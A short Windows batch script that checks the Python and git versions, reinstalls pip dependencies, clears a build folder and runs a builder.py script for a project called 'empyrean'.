@echo off

python --version 2>&1 | findstr " 3.11" >nul
if %errorlevel% == 0 (
    echo python 3.11.x and up are not supported by empyrean. Please downgrade to python 3.10.x.

    pause
    exit
)

git --version 2>&1 | findstr "git version" >nul
if not %errorlevel% == 0 (
    echo git is not installed. Please install git from https://git-scm.com/download/win

    pause
    exit
)

py -3.10 -m pip uninstall -r interferences.txt
py -3.10 -m pip install --force-reinstall -r requirements.txt

cls

if exist build rmdir /s /q build
py -3.10 builder.py

pause
